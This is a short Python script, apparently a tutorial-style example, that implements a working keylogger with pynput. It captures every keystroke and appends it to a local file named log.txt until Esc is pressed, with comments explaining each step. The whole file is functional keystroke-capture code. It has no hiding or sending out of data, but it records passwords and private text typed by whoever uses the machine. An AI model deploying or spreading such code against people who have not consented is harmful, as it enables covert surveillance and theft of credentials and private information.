from pynput.keyboard import Key , Listener
output = 'log.txt'

with open(output,'a') as f:
	f.close()                                                   #log file is created

def on_press(user_input):	                                    #The on_press function knows when a key is pressed , we are specifying what to do when a key is pressed
	with open(output,'a') as f:
		if user_input == Key.space:
			char = ' '
		else:	
			c = str(user_input)
			char = c.replace('\'','')	            #This replace function is to remove '' from the character whose key is pressed , so that the log is more readable ,otherwise log will look like this --> 'H''i' 't''h''e''r''e'
		f.write(char)
		f.close()
		
def on_release(user_input):
	if user_input==Key.esc:
		with open(output,'a') as f:
			f.write('\n')
			f.close()
		return False	                                     #stops the listener when a function returns false , for details see https://pypi.org/project/pynput/ 
		
with Listener(on_press=on_press , on_release=on_release) as listener:
	listener.join()
		
	
#s.replace('a', 'b') replaces every 'a' with 'b'
